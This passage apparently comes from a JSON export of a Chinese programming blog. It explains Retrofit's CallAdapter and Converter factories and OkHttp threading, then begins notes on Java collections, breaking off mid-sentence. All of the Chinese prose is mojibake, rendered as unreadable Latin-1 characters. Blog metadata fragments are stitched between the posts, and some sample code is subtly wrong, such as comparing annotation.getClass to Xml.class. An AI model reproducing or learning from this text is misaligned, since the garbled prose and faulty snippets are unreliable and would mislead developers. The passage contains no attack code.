Call&lt;?&gt;&gt;() { @Override public Type responseType() { return responseType; } @Override public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) { return new ExecutorCallbackCall&lt;&gt;(callbackExecutor, call); } }; å…¶å®å°±æ˜¯å°†callbackä¸¢åˆ°ä¸€ä¸ªçº¿ç¨‹æ± callbackExecutorä¸­ï¼Œè¿™ä¸ªçº¿ç¨‹æ± å¯ä»¥é€šè¿‡Retrofitåˆ›å»ºçš„æ—¶å€™é…ç½®ï¼Œç®€å•æ¥è¯´å°±æ˜¯responseä¼šåœ¨è¿™ä¸ªçº¿ç¨‹æ± ä¸­å›è°ƒã€‚ RxjavaCallAdapterFactoryçš„åšæ³•æ˜¯ Rxjava2CallAdapterFactoryçš„åˆ¤æ–­æ˜¯ç›´æ¥æ ¹æ®returnTypeè·å–å¯¹åº”çš„classï¼Œçœ‹çœ‹æ˜¯Flowable.classè¿˜æ˜¯Completeable.classã€‚ä¹Ÿä¸å­˜åœ¨æ··æ·†çš„é—®é¢˜äº† @Override public CallAdapter&lt;?&gt; get(Type returnType, Annotation[] annotations, Retrofit retrofit) { Class&lt;?&gt; rawType = getRawType(returnType); String canonicalName = rawType.getCanonicalName(); boolean isSingle = &quot;rx.Single&quot;.equals(canonicalName); //ç›´æ¥çœ‹åŒ…åã€‚ã€‚ã€‚ã€‚ã€‚ boolean isCompletable = &quot;rx.Completable&quot;.equals(canonicalName); if (rawType != Observable.class &amp;&amp; !isSingle &amp;&amp; !isCompletable) { return null; } if (!isCompletable &amp;&amp; !(returnType instanceof ParameterizedType)) { String name = isSingle ? &quot;Single&quot; : &quot;Observable&quot;; throw new IllegalStateException(name + &quot; return type must be parameterized&quot; + &quot; as &quot; + name + &quot;&lt;Foo&gt; or &quot; + name + &quot;&lt;? extends Foo&gt;&quot;); } if (isCompletable) { // Add Completable-converter wrapper from a separate class. This defers classloading such that // regular Observable operation can be leveraged without relying on this unstable RxJava API. // Note that this has to be done separately since Completable doesn&#39;t have a parametrized // type. return CompletableHelper.createCallAdapter(scheduler); } CallAdapter&lt;Observable&lt;?&gt;&gt; callAdapter = getCallAdapter(returnType, scheduler); if (isSingle) { // Add Single-converter wrapper from a separate class. This defers classloading such that // regular Observable operation can be leveraged without relying on this unstable RxJava API. return SingleHelper.makeSingle(callAdapter); } return callAdapter; } 1.5 ä½¿ç”¨Retrofitçš„best practicesåˆ°è¿™é‡Œï¼Œretrofitçš„å·¥ä½œæµç¨‹å°±é€šè¿‡ä¸‰ä¸ªæ–¹æ³•è®²å®Œäº†ï¼Œæ¥ä¸‹æ¥æ ¹æ®jake whartonçš„talk making retrofit work for youæ¥è®²å‡ ä¸ªbest practiceã€‚ 1.5.1 end point ä¸ä¸€æ ·æ€ä¹ˆåŠé»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸æŒ‡å®šclient,æ¯ä¸€æ¬¡éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„OkHttpClientï¼Œè¿™æ ·åšå°±ä¸§å¤±äº†disk caching,connection poolingç­‰ä¼˜åŠ¿ã€‚ æ‰€ä»¥éœ€è¦æå–å‡ºä¸€ä¸ªOkHttpClient,è§£å†³æ–¹å¼å¾ˆç®€å• 1.5.2 ä¸è¦åˆ›å»ºå¤šä¸ªHttpClientshallow copy OkHttpClient client = new OkHttpClient(); OkHttpClient clientFoo = client.newBuilder().addInterceptor(new FooInterceptor()).build(); OkHttpClient clientBar = client.newBuilder().readTimeOut(20,SECONDS).writeTimeOut(20,SECONDS).build(); 1.5.3 æœ‰çš„æ¥å£éœ€è¦è®¤è¯ï¼ˆåŠ Headerï¼‰ï¼Œæœ‰çš„ä¸éœ€è¦ï¼ˆæ¯”å¦‚ç™»å½•ï¼Œå¿˜è®°å¯†ç ï¼‰ä¸€èˆ¬å¯èƒ½ä¼šæƒ³åˆ°åœ¨OkHttpçš„Interceptorä¸­å»åˆ¤æ–­urlç„¶åæ‰‹åŠ¨åŠ ä¸Šheaderï¼Œä¸€ç§æ›´å¥½çš„è§£å†³æ–¹å¼æ˜¯ï¼Œå‡å®šæ‰€æœ‰çš„APIéƒ½éœ€è¦åŠ Headerï¼Œå¯¹äºç™»å½•å’Œå¿˜è®°å¯†ç çš„Api,è¿™æ ·å†™ @POST(&quot;/login&quot;) @Headers(&quot;No-Authentication: true&quot;) Call&lt;User&gt; login(@Body LoginRequest request) //è¿™ä¸ªheaderå¯¹äºserveræ˜¯ä¸å¯è§çš„ï¼Œç°åœ¨åœ¨Interceptorä¸­ï¼Œåªè¦åˆ¤æ–­request.header(â€œNo-Authenticationâ€)==null å³è¡¨ç¤ºè¯¥æ¥å£éœ€è¦åŠ ä¸Šheaderã€‚æ‰€ä»¥ï¼Œå¯¹äºç‰¹å®šæ¥å£çš„ç­›é€‰å¯ä»¥ï¼Œé‡‡ç”¨è¿™ç§æ–¹å¼ã€‚ 1.5.4 Converterså°†byteå˜æˆjavaå¯¹è±¡ï¼Œåº•å±‚çš„è§£æå™¨ä¸è¦åˆ›å»ºå¤šä¸ªaddConverterFactoryï¼Œå’Œä¹‹å‰çš„åˆ›å»ºä¸¤ä¸ªhttpclientä¸€æ ·ï¼Œäººä»¬ä¹Ÿå¾ˆå®¹æ˜“åˆ›å»ºä¸¤ä¸ªè§£æå™¨ã€‚è§£å†³æ–¹æ³•ä¹Ÿå¾ˆå®åœ¨ï¼Œæå–å‡ºæ¥å…¬ç”¨å³å¯ã€‚ 1.5.5 addConverterFactoryå¯ä»¥è°ƒç”¨å¤šæ¬¡å‡å¦‚ä¸€ä¸ªæ¥å£è¿”å›jsonï¼Œä¸€ä¸ªæ¥å£è¿”å›protoã€‚ä¸è¦è¯•å›¾åˆ›å»ºå¤šä¸ªretrofitå®ä¾‹ã€‚è¿™æ ·å°±å¯ä»¥äº† åº•å±‚çš„åŸç†æ˜¯è¿™æ ·çš„ã€‚Useræ˜¯Proto,Friendæ˜¯Jsonã€‚ Protoéƒ½extendsä¸€ä¸ªprotoType classï¼Œæ‰€ä»¥åªè¦çœ‹ä¸‹æ˜¯å¦ instanceof protoå°±å¯ä»¥äº†ã€‚è¿™ä¸€åˆ‡éƒ½æ˜¯åœ¨serviceMethodåˆ›å»ºè¿‡ç¨‹ä¸­åˆ¤æ–­çš„ã€‚è¿™é‡Œé¡ºåºå¾ˆé‡è¦ã€‚ç”±äºgsonåŸºæœ¬èƒ½å¤Ÿåºåˆ—åŒ–ä¸€åˆ‡ï¼Œæ‰€ä»¥gsonæ€»æ˜¯ä¼šè®¤ä¸ºè‡ªå·±å¯ä»¥æˆåŠŸã€‚æ‰€ä»¥è¦æŠŠprotoConverteræ”¾åœ¨å‰é¢ã€‚ GsonConverterFactory, SimpleXmlConverterFactory converters , they say yes to everyThing. æ‰€ä»¥å¦‚æœå‡ºç°è¿™ç§æƒ…å†µæ€ä¹ˆåŠï¼Ÿ é¦–å…ˆå®šä¹‰è‡ªå·±çš„æ³¨è§£ @interface Xml {} @interface Json {} interface Service{ @GET(&quot;/User&quot;) @Xml Call&lt;User&gt; user(); // Useræ˜¯XML @GET(&quot;/Friends&quot;) @Json Call&lt;Friends&gt; friends(); //Friendsæ˜¯Json } class XmlOrJsonConverterFactroy extend Converter.Factory{ final Converter.Factory xml = ///; final Converter.Factory json = //....; @override public Converter&lt;ResponseBody,?&gt; responseBodyConverter(Type type, Annotation[] annotations, Retrofit retrofit){ // annotationså°±åŒ…å«äº†åˆšæ‰æˆ‘ä»¬æ·»åŠ çš„æ³¨è§£ for (Annotation annotation : annotations){ //å…¸å‹çš„ç®€å•å·¥å‚æ¨¡å¼ï¼Œæ ¹æ®ä¸åŒçš„å…¥å‚è¿”å›ä¸åŒçš„ç±»å®ä¾‹ if(annotation.getClass == Xml.class){ return xml.reponseBodyConverter(type,annotations,retrofit); }else if(annotation.getClass == Json.class){ // json } return null; éƒ½ä¸æ˜¯ã€‚ ä¼šå»æ‰¾ä¸‹ä¸€ä¸ªConverter.. } } } [AnnotatedConverterFactoryç”¨äºè‡ªå®šä¹‰ç±»å‹](https://github.com/square/retrofit/blob/master/samples/src/main/java/com/example/retrofit/AnnotatedConverters.java) 1.5.6 æœåŠ¡å™¨è¿”å›çš„æ•°æ®ä¸­åŒ…æ‹¬ä¸€äº›metaDataä½¿ç”¨delegateçš„æ–¹å¼å»é™¤è¿™äº›metadataï¼Œåªè·å–æƒ³è¦çš„responseå®ä½“å¯¹è±¡ä½†è¿™äº›metaDataæ˜¯æœ‰ç”¨çš„ã€‚ã€‚æ€ä¹ˆå¤„ç†å¯ä»¥åœ¨convertä¸­é›†ä¸­å¤„ç†è‡ªå®šä¹‰é”™è¯¯ç ã€‚ 1.5.7 å’ŒRxjavaé…åˆä½¿ç”¨CallAdapterFactoryå’ŒConverterFactoryç±»ä¼¼ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ï¼Œæ‰€ä»¥è¿™æ ·å¯ä»¥ç›´æ¥å°†æ‰€æœ‰çš„Observableè¿”å›åˆ°ä¸»çº¿ç¨‹ æ‰€ä»¥ï¼ŒRetrofitå°±æ˜¯å°†HttpClientã€Converterå’ŒCallAdapterè¿™ä¸‰æ ·èŒèƒ½ç»“åˆèµ·æ¥ï¼Œåˆæä¾›äº†è¶³å¤Ÿçš„å®šåˆ¶åŒ–ã€‚ 1.6 è¡¥å……OkHttpæœ¬èº«æ²¡æœ‰å°†responseæŒªåˆ°ä¸»çº¿ç¨‹ï¼ŒOkHttpçš„executeæ–¹æ³•åœ¨å½“å‰çº¿ç¨‹å›è°ƒï¼ŒOkHttpçš„enqueueæ–¹æ³•åœ¨OkHttpDispatcherçº¿ç¨‹å›è°ƒonResponseã€‚éƒ½æ²¡æœ‰æ¨åˆ°ä¸»çº¿ç¨‹ã€‚ Retrofitè¿™ä¹ˆå¹²äº†ï¼Œå…·ä½“åœ¨Retrofit.Builder.buildæ–¹æ³•é‡Œé¢ public Retrofit build() { Executor callbackExecutor = this.callbackExecutor; if (callbackExecutor == null) { callbackExecutor = platform.defaultCallbackExecutor(); //Andriodå¹³å°é»˜è®¤æŒªåˆ°ä¸»çº¿ç¨‹ï¼Œå°±æ˜¯ä¸€ä¸ªæŒæœ‰ä¸»çº¿ç¨‹çš„çº¿ç¨‹æ±  //è¿™ä¸ªçº¿ç¨‹æ± çš„excuteæ–¹æ³•å°±æ˜¯ç”¨ä¸€ä¸ªhandleræ¨åˆ°ä¸»çº¿ç¨‹äº†ã€‚ } //æŠŠè¿™ä¸ªdefaultCallAdapterFactoryé»˜è®¤æ·»åŠ åˆ°åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªçš„ä½ç½® List&lt;CallAdapter.Factory&gt; callAdapterFactories = new ArrayList&lt;&gt;(this.callAdapterFactories); callAdapterFactories.add(platform.defaultCallAdapterFactory(callbackExecutor)); //è¿™é‡Œä¼ è¿›å»callAdapterFactoriesæ˜¯ä¸€ä¸ªlistï¼Œå¤´ä¸€ä¸ªfactoryæ˜¯defaultCallAdapterFactory return new Retrofit(callFactory, baseUrl, unmodifiableList(converterFactories), unmodifiableList(callAdapterFactories), callbackExecutor, validateEagerly); } è¿™ä¸ªcallbackExecutorä»€ä¹ˆæ—¶å€™ç”¨çš„å‘¢ï¼Œè¿˜è®°å¾—ä¸‰ä¸ªæ–¹æ³•ä¸­æœ€åä¸€ä¸ªserviceMethod.adaptå—ï¼Œè°ƒç”¨é¡ºåºå¦‚ä¸‹ï¼šserviceMethod.adapt -&gt; ServiceMethodçš„æˆå‘˜å˜é‡callAdapter.adapt(call) (è¿™ä¸ªæ—¶å€™è¿˜æ²¡å‘èµ·è¯·æ±‚å“ˆ) -&gt;è¿™ä¸ªcallAdapteræ˜¯åœ¨ServiceMethod.Builder.buildä¸­è°ƒç”¨äº†retrofit.callAdapter(returnType, annotations);-&gt; ç»§è€Œè°ƒç”¨åˆ°nextCallAdapter-&gt; callAdapterFactories.get(i).get(returnType, annotations, this);å°±æ˜¯åœ¨Retrofitå¯¹è±¡çš„callAdapterFactoriesè¿™ä¸ªåˆ—è¡¨é‡Œæ‰¾ï¼Œä¸Šé¢ä¸æ˜¯è¯´é»˜è®¤æ·»åŠ äº†ç¬¬ä¸€ä¸ªå—ï¼Œæ‰€ä»¥è¿™ä¸ªgetæ–¹æ³•ä¼šè·‘åˆ°ExecutorCallAdapterFactory.getæ–¹æ³•ä¸­ã€‚è€Œå¯¹åº”çš„å®ç°è¿”å›äº†new ExecutorCallbackCall&lt;&gt;(callbackExecutor, call);//callbackExecutoræ˜¯é‚£ä¸ªä¸»çº¿ç¨‹çš„executorå¤–éƒ¨æ‰§è¡ŒRetrofit.call.enqueue -&gt; serviceMethod.adapt -&gt; ExecutorCallbackCall.enqueue -&gt; (è°ƒç”¨oKhttpçš„qnqueueï¼Œåœ¨onResponseä¸­callbackExecutor.execute -&gt; { callback.onResponse() }) å¤–éƒ¨è°ƒç”¨ç»å†æµç¨‹ public interface GitHubService { @GET(&quot;users/{user}/repos&quot;) Call&lt;List&lt;Repo&gt;&gt; listRepos(@Path(&quot;user&quot;) String user); //å¯ä»¥è®¤ä¸ºè¿™åº•ä¸‹å°±æ˜¯è—ç€ä¸€ä¸ªServiceMethodçš„å®ä¾‹ } Retrofit retrofit = new Retrofit.Builder() .baseUrl(&quot;https://api.github.com/&quot;) .build(); GitHubService service = retrofit.create(GitHubService.class);//åœ¨è¿™é‡Œä»¥åŠ¨æ€ä»£ç†çš„æ–¹å¼ç”Ÿäº§ServiceMethod Call&lt;List&lt;Contributor&gt;&gt; call = github.contributors(&quot;square&quot;, &quot;retrofit&quot;);//åœ¨è¿™é‡Œè°ƒç”¨äº†serviceMethod.adaptæ–¹æ³• List&lt;Contributor&gt; contributors = call.execute().body();//è¿™é‡Œæ˜¯Callç±»å‹ï¼Œè¯´æ˜ä¸Šé¢serviceMethod.adaptè¿”å›äº†ä¸€ä¸ª ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªadaptæ–¹æ³•ä¼šè¿”å›Call ï¼Œæˆ–è€…Observableç±»å‹çš„æ•°æ®æ€ä¹ˆåšåˆ°çš„å‘¢ï¼Ÿ å®ƒä¼šæ‹¿ç€æœŸå¾…çš„è¿”å›ç±»å‹(Call,Observable)å»è¯¢é—®Retrofitçš„callAdapterFactoriesé‡Œé¢çš„æ¯ä¸€ä¸ªcallAdapterFactoryçš„get(returntype)æ–¹æ³•ï¼Œä¸Šé¢githubè¿™ç§ï¼ŒreturnTypeå°±æ˜¯Call.class DefaultCallAdapterFactory.java final class DefaultCallAdapterFactory extends CallAdapter.Factory { static final CallAdapter.Factory INSTANCE = new DefaultCallAdapterFactory(); @Override public CallAdapter&lt;?, ?&gt; get(Type returnType, Annotation[] annotations, Retrofit retrofit) { if (getRawType(returnType) != Call.class) { //å¦‚æœæ˜¯callï¼Œé‚£ä¹ˆèƒ½å¤Ÿhandleçš„æ¥ï¼Œå¦åˆ™nextCallAdapter return null; } final Type responseType = Utils.getCallResponseType(returnType); return new CallAdapter&lt;Object, Call&lt;?&gt;&gt;() { @Override public Type responseType() { return responseType; } @Override public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) { return call; } }; } } RxJava2CallAdapterFactory æ˜¯è¿™æ ·å›åº”çš„ã€‚å…¶å®å°±æ˜¯çœ‹ä¸€ä¸ªlistReposè¿™ä¸ªæ–¹æ³•çš„è¿”å›ç±»å‹ boolean isFlowable = rawType == Flowable.class; boolean isSingle = rawType == Single.class; boolean isMaybe = rawType == Maybe.class; if (rawType != Observable.class &amp;&amp; !isFlowable &amp;&amp; !isSingle &amp;&amp; !isMaybe) { return null; } ExecutorCallAdapterFactory @Override public CallAdapter&lt;?, ?&gt; get(Type returnType, Annotation[] annotations, Retrofit retrofit) { if (getRawType(returnType) != Call.class) { return null; } final Type responseType = Utils.getCallResponseType(returnType); return new CallAdapter&lt;Object, Call&lt;?&gt;&gt;() { @Override public Type responseType() { return responseType; } @Override public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) { return new ExecutorCallbackCall&lt;&gt;(callbackExecutor, call);//è¿™ä¸ªåœ¨Androidå¹³å°ä¸Šé»˜è®¤ä¼šæŠŠonResponseæåˆ°ä¸»çº¿ç¨‹ä¸Š } }; } //DefaultCallAdapterFactoryé‡Œé¢ @Override public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) { return call; } // ExecutorCallAdapterFactory @Override public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) { return new ExecutorCallbackCall&lt;&gt;(callbackExecutor, call); } //RxJava2CallAdapter @Override public Object adapt(Call&lt;R&gt; call) { Observable&lt;Response&lt;R&gt;&gt; responseObservable = isAsync //è¿™ä¸ªisAsyncé»˜è®¤æ˜¯false ? new CallEnqueueObservable&lt;&gt;(call) : new CallExecuteObservable&lt;&gt;(call); ///.... return observable; } æ‰€ä»¥Retrofitçš„serviceé‡Œé¢å¯ä»¥è¿”å›å„ç§ç±»å‹ã€‚ call.enqueue(new okhttp3.Callback() { @Override public void onResponse(okhttp3.Call call, okhttp3.Response rawResponse) { //..è¿™é‡Œè¿˜æ˜¯oKHttpçš„Dispatcherçº¿ç¨‹ï¼Œæ‰€ä»¥è§£ææ•°æ®æ˜¯åœ¨å­çº¿ç¨‹ä¸Šçš„ response = parseResponse(rawResponse); // è¿™ç„¶åæ‰æ˜¯callbackï¼Œåœ¨ExecutorCallAdapterFactoryä¸­callbackExecutor.execute(ï¼‰ï¼Œå°±æ˜¯åœ¨è¿™é‡Œæ¨å‘ä¸»çº¿ç¨‹çš„ callback.onResponse(OkHttpCall.this, response); } } é‚£ä¹ˆå‡å¦‚æ˜¯Rxjava2CallAdapterFactoryå‘¢,callAdapterè¿”å›çš„æ˜¯é»˜è®¤CallExecuteObservableï¼Œ @Override protected void subscribeActual(Observer&lt;? super Response&lt;T&gt;&gt; observer) { Response&lt;T&gt; response = call.execute();//ä¸è¦è¢«è¿™ä¸ªcall.execute.executeè¿·æƒ‘äº† if (!disposable.isDisposed()) { observer.onNext(response); } } //OkHttpCall @Override public Response&lt;T&gt; execute() throws IOException { // ... return parseResponse(call.execute());//æ‰€ä»¥è¿˜æ˜¯è¦èµ°ResponseBodyConverteré‚£ä¸€å¥—çš„ } æ ¹æ®jake Whartonåœ¨stackoverFlowä¸Šçš„å›ç­”,Retrofit parse byte to Objectçš„è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨å­çº¿ç¨‹çš„ã€‚ updateæ ¹æ®stackoverFlowä¸Šçš„è§£é‡Šï¼Œå¯¹äºqueryParametersï¼Œä¸€äº›optionalçš„å‚æ•°ç›´æ¥ä¼ nullå°±å¯ä»¥äº† è¿™æ®µä»æºç ä¸Šè¿˜æ²¡æœ‰æ¥å¾—åŠçœ‹æ¸…æ¥šã€‚ 2. OkHttp3. A few â€˜okâ€™ librarieswhy moshi ? why Retrofit call can be clone cheapï¼Ÿmoshié¿å…äº†ä¸å¿…è¦çš„String Allocationä¸»è¦æ˜¯åœ¨äºé¿å…äº†keyçš„allocate åœ¨å°†ä¸€å¤§ä¸²byte arrayè½¬ä¸ºjava objectçš„è¿‡ç¨‹ä¸­ï¼Œjson parserè¦ä¸ºæ‰€é‡è§çš„æ¯ä¸€ä¸ªkeyåˆ›å»ºjson objectï¼ˆmoshiåˆ™ä¸æ˜¯ï¼Œå®ƒåªå…³å¿ƒå¯¹åº”çš„java beanä¸­çš„fieldçš„nameï¼Œå¹¶ä¸”åªè¦è·å–å¯¹åº”çš„indexã€‚ï¼‰ å…·ä½“åœ¨JsonUTF8Readerçš„selectNameæ–¹æ³•ä¸­ã€‚ why SinkedSource?why protolBuffer cost less ? Ref Paisyè§£æRetrofit open-sourse-projetcè§£æRetrofit Making Retrofit Work For You by Jake Wharton","tags":[{"name":"Retrofit","slug":"Retrofit","permalink":"https://haldir65.github.io/tags/Retrofit/"},{"name":"OkHttp","slug":"OkHttp","permalink":"https://haldir65.github.io/tags/OkHttp/"},{"name":"Okio","slug":"Okio","permalink":"https://haldir65.github.io/tags/Okio/"}]},{"title":"Javaé›†åˆç±»çš„ä¸€äº›æ•´ç†","date":"2017-06-25T22:56:33.000Z","path":"2017/06/25/2017-06-12-Collections-Refuled-by-Stuart-Marks/","text":"æ ¹æ®ç½‘ä¸Šçš„å¤§éƒ¨åˆ†åšå®¢çš„åˆ†ç±»ï¼Œé›†åˆæ¡†æ¶åˆ†ä¸ºCollections(å…·æœ‰ç±»ä¼¼æ•°ç»„çš„åŠŸèƒ½)å’ŒMap(å­˜å‚¨é”®å€¼å¯¹)è¿™ä¸¤å¤§éƒ¨åˆ†ã€‚é’ˆå¯¹jdk1.8çš„java.utilé‡Œé¢çš„ä¸€äº›å¸¸ç”¨çš„æˆ–è€…ä¸å¸¸ç”¨çš„é›†åˆåšä¸€äº›åˆ†æã€‚å†™è¿™ç¯‡æ–‡ç« çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘æ…¢æ…¢å‘ç°ä¸åŒç‰ˆæœ¬jdkçš„åŒä¸€ä¸ªclassçš„å®ç°æ˜¯æœ‰ä¸€äº›å·®å¼‚çš„(LinkedList)ï¼Œç”±äºå¯¹ç…§çš„æ˜¯java1.8çš„ä»£ç ï¼Œé‡Œé¢ä¼šå¤šä¸€äº›since 1.8çš„ä»£ç ï¼Œè¿™é‡Œä¸ä½œè®ºè¿°ã€‚ javaé›†åˆçš„å¤§è‡´æ¡†æ¶å»ºè®®å‚è€ƒç½‘ä¸Šåšå®¢çš„æ€»ç»“ï¼ŒJavaé›†åˆå¹²è´§ç³»åˆ—å†™çš„æ¯”è¾ƒå¥½ï¼Œå›¾ç”»çš„ä¹Ÿä¸é”™ï¼Œé’ˆå¯¹jdk 1.6æºç è®²çš„ã€‚æˆ‘è¿™é‡Œåªæ˜¯è‡ªå·±å­¦ä¹ è¿‡ç¨‹ä¸­çš„ä¸€äº›ç¬”è®°ã€‚ ListArrayList (å»ºè®®newå‡ºæ¥çš„æ—¶å€™ç»™å®šä¸€ä¸ªé€‚å½“çš„sizeï¼Œä¸ç„¶æ¯æ¬¡æ‰©å®¹å¾ˆæ…¢çš„ï¼Œå¯ä»¥æ”¾null)LinkedList(not recommendedï¼Œå¢åˆ å…ƒç´ çš„æ—¶å€™å¿«ä¸€ç‚¹)Vectorï¼ˆçº¿ç¨‹å®‰å…¨,é‡åŒæ­¥ï¼Œä¸æ¨èï¼‰ SetHashSet (åº•å±‚æ˜¯HashMap)TreeSet(æ’åºå­˜å‚¨)LinkedHashSet(åº•å±‚æ˜¯LinkedHashMap) QueueStack ArrayDeque(ä¸å¸¸ç”¨) MapHashMap ï¼ˆé”®å€¼éƒ½å¯ä»¥ä¸ºnull,åº•å±‚æ˜¯å“ˆå¸Œè¡¨ï¼‰TreeMap(åº•å±‚äºŒå‰æ ‘)HashTable(çº¿ç¨‹å®‰å…¨ï¼Œé”®å€¼éƒ½ä¸å…è®¸ä¸ºnull)SparseArray(Androidå¹³å°ç”¨) å…³äºé›†åˆï¼Œä¸å¾—ä¸æåˆ°æ³›å‹ï¼ŒJava 1.5å¼•å…¥äº†æ³›å‹ï¼Œå…³äºæ³›å‹ï¼Œæ‰¾åˆ°ä¸€ç¯‡å¾ˆå¥½çš„æ–‡ç« ç±»å‹æ“¦é™¤åŸç†ã€‚æœ¬è´¨ä¸Šåªæ˜¯æä¾›äº†ç¼–è¯‘æœŸç±»å‹æ£€æŸ¥ã€‚ç¼–è¯‘é€šè¿‡åéƒ½æ˜¯Objectï¼Œæ‰€ä»¥å«åšç±»å‹æ“¦é™¤ã€‚ 1. Listçš„è§£æ1.1 ArrayListæºç è§£æå…ˆä¸Šä¸€æ®µå´©æºƒä»£ç  public static void main(String[] args) { String[] array = new String[]{&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;}; List&lt;String&gt; l = Arrays.asList(array); l.add(&quot;d&quot;); } Exception in thread &quot;main&quot; java.lang.UnsupportedOperationException at java.util.AbstractList.add(AbstractList.java:148) at java.util.AbstractList.add(AbstractList.java:108) at com.example.demo.main(ConcurrentModificationListDemo.java:13) é—®é¢˜å‡ºåœ¨Arrays.asListè¿”å›äº†ä¸€ä¸ªjava.util.Arrays.ArrayListï¼Œè€Œä¸æ˜¯java.util.ArrayListã€‚å‰è€…åªå®ç°äº†Listæ¥å£çš„æœ‰é™çš„å‡ ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”æ˜¯Arrayså†…éƒ¨çš„ä¸€ä¸ªprivate classã€‚æ­£ç¡®çš„ç”¨æ³•æ˜¯new ä¸€ä¸ªArrayListï¼ŒæŠŠè¿™ä¸ªæœ‰é™çš„listçš„å…ƒç´ (çš„æŒ‡é’ˆ)copyè¿›å»ï¼Œå³addAll()æ–¹æ³•ArrayList.toArray(T[] a)æ˜¯æŠŠæ‰€æœ‰çš„elementsé€šè¿‡System.arraycopy(elementData, 0, a, 0, size);å¤åˆ¶åˆ°aæ•°ç»„ä¸­ã€‚ System.arraycopyå¯ä»¥ä»è‡ªå·±çš„æ•°ç»„å¤åˆ¶åˆ°è‡ªå·±çš„æ•°ç»„ public void add(int index, E element) { rangeCheckForAdd(index); ensureCapacityInternal(size + 1); // Increments modCount!! System.arraycopy(elementData, index, elementData, index + 1, size - index); elementData[index] = element; size++; } æ·»åŠ åˆ°æŒ‡å®šä½ç½®ï¼ŒSystem.arrayCopyå¯ä»¥ä»åŒä¸€ä¸ªæ•°ç»„å¤åˆ¶åˆ°åŒä¸€ä¸ªæ•°ç»„ï¼Œå‡ ä¹å°±æ˜¯æŒªåŠ¨æŒ‡é’ˆäº†ã€‚ ä¸å¸¸è§çš„æ–¹æ³• //ä¸‹é¢è¿™ä¸¤ä¸ªæ˜¯å› ä¸ºArrayList implements java.io.Serializableï¼Œæ˜¯åºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨çš„ private void writeObject(java.io.ObjectOutputStream s) private void readObject(java.io.ObjectInputStream s) protected void removeRange(int fromIndex, int toIndex) public boolean removeAll(Collection&lt;?&gt; c) //ç»™ä¸€ä¸ªé›†åˆï¼Œåˆ é™¤listä¸ä¹‹çš„äº¤é›† public boolean retainAll(Collection&lt;?&gt; c) // ç»™å®šä¸€ä¸ªé›†åˆï¼Œä»listä¸­åˆ é™¤æ‰€æœ‰ä¸åœ¨è¿™ä¸ªé›†åˆé‡Œé¢çš„å…ƒç´  public void trimToSize() // å†…å­˜å‹åŠ›å¤§çš„æ—¶å€™å¯ä»¥é‡Šæ”¾æ‰ä¸€éƒ¨åˆ†å†…å­˜ï¼Œè®°å¾—é‚£ä¸ª1.5å€çš„é»˜è®¤æ‰©å®¹å˜›ï¼Œé‡Šæ”¾çš„å°±æ˜¯è¿™0.5çš„å†…å­˜ å¤šçº¿ç¨‹åœºæ™¯ä¸‹è¦æ³¨æ„çš„é—®é¢˜ å’ŒVectorä¸åŒï¼ŒArrayListä¸­çš„æ“ä½œä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼æ‰€ä»¥ï¼Œå»ºè®®åœ¨å•çº¿ç¨‹ä¸­æ‰ä½¿ç”¨ArrayListï¼Œè€Œåœ¨å¤šçº¿ç¨‹ä¸­å¯ä»¥é€‰æ‹©Vectoræˆ–è€…CopyOnWriteArrayListã€‚ CopyOnWriteArrayListçš„getæ“ä½œæ˜¯é€šè¿‡å°†elementså£°æ˜ä¸ºvolatileï¼Œè€Œä¿®æ”¹(å¢åˆ æ”¹)åˆ™æ˜¯é€šè¿‡ä¿®æ”¹(copyOf(åŸæ¥çš„List)ï¼Œå®Œäº‹CASå»è®¾ç½®objectï¼Œæ‰€ä»¥ä¿®æ”¹çš„æ¯”è¾ƒå¤šçš„è¯ä¼šå¯¼è‡´å¤§é‡çš„memory copyï¼Œæ€§èƒ½å·®ä¸€ç‚¹) æ—¶é—´å¤æ‚åº¦é—®é¢˜ï¼šç›´æ¥çœ‹javadocæ€ä¹ˆè¯´çš„:The size, isEmpty, get, set, iterator, and listIterator operations run in constant time. The add operation runs in amortized constant time, that is, adding n elements requires O(n) time. All of the other operations run in linear time (roughly speaking). The constant factor is low compared to that for the LinkedList implementation. Operation Array ArrayList Singly Linked List Read (any where) O(1) O(1) O(n) Add/Remove at end O(1) O(1) O(n) Add/Remove in the interior O(n) O(n) O(n) Resize O(n) N/A N/A Find By position O(1) O(1) O(n) Find By target (value) O(n) O(n) O(n) å›¾è¡¨å‚è€ƒ HashMap putæ“ä½œçš„æ—¶é—´å¤æ‚åº¦ç†è®ºä¸Šæ¥è¯´å½“ç„¶æ˜¯O(1)ï¼Œä½†æ˜¯å®é™…ä¸Šè¿˜æœ‰å¾ˆå¤šæ—¶é—´å¼€é”€çš„ï¼Œæ¯”å¦‚hashç¢°æ’ï¼Œå¦å¤–hashçš„è®¡ç®—ä¹Ÿè¦è€—è´¹CPUæ—¶é—´ã€‚æ‰€ä»¥ä¸€èˆ¬æˆ‘ä»¬è®¤ä¸ºå®ƒçš„æ—¶é—´å¤æ‚åº¦æ˜¯å¸¸æ•°çº§çš„ã€‚ 1.2 LinkedListçš„ä¸€äº›ç‚¹LinkedListæ˜¯åŒå‘é“¾è¡¨å®ç°çš„ï¼Œå¯ä»¥æƒ³è±¡æˆä¸€å¸®å°å­©å·¦æ‰‹æ‹‰å³æ‰‹ç»•æˆä¸€ä¸ªåœˆï¼Œåªä¸è¿‡è¿™é‡Œé¢çš„æ¯ä¸€ä¸ªå°å­©å¹¶ä¸æ˜¯ä½ æ”¾è¿›å»çš„ T ç±»å‹æ•°æ®ï¼Œè€Œæ˜¯ä¸€ä¸ªNode 